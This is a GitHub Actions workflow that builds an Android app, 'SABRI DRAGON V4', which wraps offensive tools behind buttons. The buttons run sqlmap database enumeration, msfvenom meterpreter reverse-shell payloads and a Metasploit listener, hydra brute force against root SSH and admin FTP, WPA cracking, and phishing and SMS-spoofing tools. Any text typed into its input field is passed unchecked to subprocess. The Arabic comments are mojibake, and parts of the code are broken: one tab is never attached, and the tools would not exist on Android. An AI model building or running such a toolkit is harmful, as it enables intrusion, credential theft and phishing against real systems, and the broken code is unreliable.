name: ðŸ‰ SABRI DRAGON V4 - BUILD APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:  # ØªØ´ØºÙŠÙ„ ÙŠØ¯ÙˆÙŠ

jobs:
  build:
    runs-on: ubuntu-22.04
    steps:
      - name: ðŸ“¥ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù…Ø´Ø±ÙˆØ¹
        uses: actions/checkout@v4

      - name: ðŸ”§ ØªØ«Ø¨ÙŠØª Ø§Ù„Ù…ØªØ·Ù„Ø¨Ø§Øª
        run: |
          sudo apt update
          sudo apt install -y \
            python3-pip \
            git \
            openjdk-17-jdk \
            zlib1g-dev \
            libssl-dev \
            libffi-dev \
            build-essential \
            autoconf \
            libtool \
            pkg-config \
            libncurses5-dev \
            libncursesw5-dev \
            libtinfo5 \
            libxml2-dev \
            libxslt1-dev \
            ccache

      - name: ðŸ ØªØ«Ø¨ÙŠØª Python packages
        run: |
          pip install --upgrade pip setuptools wheel
          pip install cython==3.0.0
          pip install kivy==2.2.1
          pip install kivymd==1.1.1
          pip install buildozer
          pip install python-for-android
          
      - name: ðŸ“¦ ØªØ¬Ù‡ÙŠØ² Ø§Ù„Ø£Ø¯ÙˆØ§Øª Ø§Ù„Ù‚ØªØ§Ù„ÙŠØ©
        run: |
          # ØªØ«Ø¨ÙŠØª nmap
          sudo apt install -y nmap
          
          # ØªØ«Ø¨ÙŠØª sqlmap
          git clone https://github.com/sqlmapproject/sqlmap.git /opt/sqlmap
          ln -sf /opt/sqlmap/sqlmap.py /usr/local/bin/sqlmap
          
          # ØªØ«Ø¨ÙŠØª metasploit framework (Ø¥ØµØ¯Ø§Ø± Ø®ÙÙŠÙ)
          curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
          chmod 755 msfinstall
          sudo ./msfinstall
          
          # ØªØ«Ø¨ÙŠØª aircrack-ng
          sudo apt install -y aircrack-ng
          
          # ØªØ«Ø¨ÙŠØª hydra
          sudo apt install -y hydra

      - name: ðŸ—ï¸ Ø¥Ù†Ø´Ø§Ø¡ Ù…Ù„ÙØ§Øª Ø§Ù„Ù…Ø´Ø±ÙˆØ¹
        run: |
          mkdir -p ~/.buildozer
          
          # Ø¥Ù†Ø´Ø§Ø¡ main.py
          cat > main.py << 'EOF'
'''
SABRI DRAGON V4 - 2060 EDITION
Ø§Ù„Ù†Ø³Ø®Ø© Ø§Ù„ØºØ§Ø´Ù…Ø© - Ø¬Ù…ÙŠØ¹ Ø£Ø¯ÙˆØ§Øª Ø§Ù„Ø§Ø®ØªØ±Ø§Ù‚
'''

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.textinput import TextInput
from kivy.uix.tabbedpanel import TabbedPanel, TabbedPanelItem
from kivy.core.window import Window
from kivy.clock import Clock
from kivy.uix.scrollview import ScrollView
import threading
import subprocess
import os

# ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ø£Ù„ÙˆØ§Ù†
Window.clearcolor = (0.05, 0.05, 0.1, 1)  # Ø£Ø²Ø±Ù‚ Ø¯Ø§ÙƒÙ†

class TerminalOutput(ScrollView):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.output = Label(
            text='[b][color=FFD700]SABRI DRAGON V4 - 2060[/color][/b]\\n' + '='*50 + '\\n',
            markup=True,
            size_hint_y=None,
            font_size='14sp',
            halign='left',
            valign='top',
            color=(0, 1, 0, 1)
        )
        self.output.bind(texture_size=self.update_height)
        self.add_widget(self.output)
    
    def update_height(self, *args):
        self.output.height = self.output.texture_size[1]
    
    def append(self, text):
        def update(dt):
            self.output.text = text + '\\n' + self.output.text
        Clock.schedule_once(update)

class ToolButton(Button):
    def __init__(self, tool_name, command, **kwargs):
        super().__init__(**kwargs)
        self.tool_name = tool_name
        self.command = command
        self.text = tool_name
        self.size_hint_y = None
        self.height = 50
        self.background_color = (0.2, 0.2, 0.3, 1)
        self.color = (1, 1, 1, 1)
        self.bind(on_press=self.run_tool)
    
    def run_tool(self, instance):
        app = App.get_running_app()
        app.terminal.append(f'[color=FFD700]ðŸš€ ØªØ´ØºÙŠÙ„: {self.tool_name}[/color]')
        
        def run():
            try:
                result = subprocess.getoutput(self.command)
                Clock.schedule_once(lambda dt: app.terminal.append(result))
            except Exception as e:
                Clock.schedule_once(lambda dt: app.terminal.append(f'[color=FF0000]âŒ Ø®Ø·Ø£: {str(e)}[/color]'))
        
        threading.Thread(target=run, daemon=True).start()

class SabriDragonApp(App):
    def build(self):
        main_layout = BoxLayout(orientation='vertical')
        
        # Ø§Ù„Ø¹Ù†ÙˆØ§Ù†
        title_bar = BoxLayout(size_hint_y=0.1, padding=10)
        title = Label(
            text='[b][color=FFD700]ðŸ‰ SABRI DRAGON V4 - 2060 EDITION[/color][/b]',
            markup=True,
            font_size='20sp'
        )
        title_bar.add_widget(title)
        main_layout.add_widget(title_bar)
        
        # Ø§Ù„ØªØ¨ÙˆÙŠØ¨Ø§Øª
        tabs = TabbedPanel(do_default_tab=False, size_hint_y=0.5)
        
        # ØªØ¨ÙˆÙŠØ¨ Network
        network_tab = TabbedPanelItem(text='ðŸŒ Network')
        network_layout = BoxLayout(orientation='vertical', padding=10, spacing=5)
        network_layout.add_widget(ToolButton('ðŸ” Nmap Scan', 'nmap -sV 127.0.0.1'))
        network_layout.add_widget(ToolButton('ðŸ“¡ Netstat', 'netstat -an'))
        network_layout.add_widget(ToolButton('ðŸ•¸ï¸ Traceroute', 'traceroute google.com'))
        network_layout.add_widget(ToolButton('ðŸŒ DNS Lookup', 'nslookup google.com'))
        network_tab.add_widget(network_layout)
        tabs.add_widget(network_tab)
        
        # ØªØ¨ÙˆÙŠØ¨ WiFi
        wifi_tab = TabbedPanelItem(text='ðŸ“¶ WiFi')
        wifi_layout = BoxLayout(orientation='vertical', padding=10, spacing=5)
        wifi_layout.add_widget(ToolButton('ðŸ“¡ Airodump', 'airodump-ng wlan0'))
        wifi_layout.add_widget(ToolButton('ðŸ”“ Aircrack', 'aircrack-ng handshake.cap'))
        wifi_layout.add_widget(ToolButton('ðŸ“Š WiFi Scan', 'iwlist wlan0 scan'))
        wifi_layout.add_widget(ToolButton('ðŸ”‘ WPA Cracker', 'crunch'))
        wifi_tab.add_widget(wifi_layout)
        tabs.add_widget(wifi_tab)
        
        # ØªØ¨ÙˆÙŠØ¨ SQL
        sql_tab = TabbedPanelItem(text='ðŸ’‰ SQL')
        sql_layout = BoxLayout(orientation='vertical', padding=10, spacing=5)
        sql_layout.add_widget(ToolButton('ðŸŽ¯ SQLmap Basic', 'sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --batch'))
        sql_layout.add_widget(ToolButton('ðŸ” SQL Scan', 'sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs'))
        sql_layout.add_widget(ToolButton('ðŸ“‹ Get Tables', 'sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables'))
        sql_tab.add_widget(sql_layout)
        tabs.add_widget(sql_tab)
        
        # ØªØ¨ÙˆÙŠØ¨ Exploit
        exploit_tab = TabbedPanelItem(text='ðŸ’€ Exploit')
        exploit_layout = BoxLayout(orientation='vertical', padding=10, spacing=5)
        exploit_layout.add_widget(ToolButton('ðŸŽ¯ Metasploit', 'msfconsole -q'))
        exploit_layout.add_widget(ToolButton('ðŸ”¨ Payload Android', 'msfvenom -p android/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=4444 -o payload.apk'))
        exploit_layout.add_widget(ToolButton('ðŸ”¨ Payload Windows', 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=4444 -o payload.exe'))
        exploit_layout.add_widget(ToolButton('ðŸ“¡ Listener', 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"'))
        exploit_tab.add_widget(exploit_layout)
        tabs.add_widget(exploit_tab)
        
        # ØªØ¨ÙˆÙŠØ¨ Brute Force
        brute_tab = TabbedPanelItem(text='âš¡ Brute Force')
        brute_layout = BoxLayout(orientation='vertical', padding=10, spacing=5)
        brute_layout.add_widget(ToolButton('ðŸ” Hydra SSH', 'hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1'))
        brute_layout.add_widget(ToolButton('ðŸ” Hydra FTP', 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://127.0.0.1'))
        brute_layout.add_widget(ToolButton('ðŸ”‘ John Ripper', 'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt'))
        brute_tab.add_widget(brute_layout)
        tabs.add_widget(brute_tab)
        
        # ØªØ¨ÙˆÙŠØ¨ Social
        social_tab = TabbedPanelItem(text='ðŸŽ­ Social')
        social_layout = BoxLayout(orientation='vertical', padding=10, spacing=5)
        social_layout.add_widget(ToolButton('ðŸ“§ Email Phish', 'setoolkit'))
        social_layout.add_widget(ToolButton('ðŸŒ Website Clone', 'httrack'))
        social_layout.add_widget(ToolButton('ðŸ“± SMS Spoof', 'ghost'))
        social_tab.add_widget(social_layout)
        
        main_layout.add_widget(tabs)
        
        # Ø­Ù‚Ù„ Ø§Ù„Ø£ÙˆØ§Ù…Ø±
        cmd_layout = BoxLayout(size_hint_y=0.1, padding=5, spacing=5)
        self.cmd_input = TextInput(
            multiline=False,
            hint_text='Ø§ÙƒØªØ¨ Ø£Ù…Ø±Ø§Ù‹ Ù…Ø®ØµØµØ§Ù‹...',
            size_hint_x=0.7
        )
        run_btn = Button(
            text='ØªØ´ØºÙŠÙ„',
            size_hint_x=0.3,
            background_color=(0.2, 0.5, 0.2, 1)
        )
        run_btn.bind(on_press=self.run_custom_command)
        cmd_layout.add_widget(self.cmd_input)
        cmd_layout.add_widget(run_btn)
        main_layout.add_widget(cmd_layout)
        
        # Ø§Ù„Ø·Ø±ÙÙŠØ©
        self.terminal = TerminalOutput(size_hint_y=0.3)
        main_layout.add_widget(self.terminal)
        
        return main_layout
    
    def run_custom_command(self, instance):
        cmd = self.cmd_input.text
        if cmd:
            self.terminal.append(f'[color=FFD700]$ {cmd}[/color]')
            
            def run():
                try:
                    result = subprocess.getoutput(cmd)
                    Clock.schedule_once(lambda dt: self.terminal.append(result))
                except Exception as e:
                    Clock.schedule_once(lambda dt: self.terminal.append(f'[color=FF0000]âŒ Ø®Ø·Ø£: {str(e)}[/color]'))
            
            threading.Thread(target=run, daemon=True).start()
            self.cmd_input.text = ''

if __name__ == '__main__':
    SabriDragonApp().run()
EOF

          # Ø¥Ù†Ø´Ø§Ø¡ buildozer.spec
          cat > buildozer.spec << 'EOF'
[app]
title = SABRI DRAGON V4 2060
package.name = sabridragon
package.domain = com.sabri.dragon

source.dir = .
source.include_exts = py,png,jpg,kv,atlas,txt

version = 0.1
requirements = python3,kivy==2.2.1,kivymd==1.1.1

orientation = portrait
osx.python_version = 3
osx.kivy_version = 2.2.1

fullscreen = 0

# Ø§Ù„Ø£Ø°ÙˆÙ†Ø§Øª Ø§Ù„ÙƒØ§Ù…Ù„Ø©
android.permissions = INTERNET,ACCESS_WIFI_STATE,CHANGE_WIFI_STATE,ACCESS_FINE_LOCATION,ACCESS_COARSE_LOCATION,WRITE_EXTERNAL_STORAGE,READ_EXTERNAL_STORAGE,ACCESS_NETWORK_STATE,CHANGE_NETWORK_STATE

android.archs = arm64-v8a
android.ndk = 25b
android.sdk = 33
android.minapi = 21
android.api = 33
android.accept_sdk_license = True

[buildozer]
log_level = 2
warn_on_root = 1
EOF

      - name: ðŸš€ Ø¨Ù†Ø§Ø¡ APK
        run: |
          buildozer android debug

      - name: ðŸ“¦ Ø±ÙØ¹ APK
        uses: actions/upload-artifact@v4
        with:
          name: sabri-dragon-apk
          path: bin/*.apk
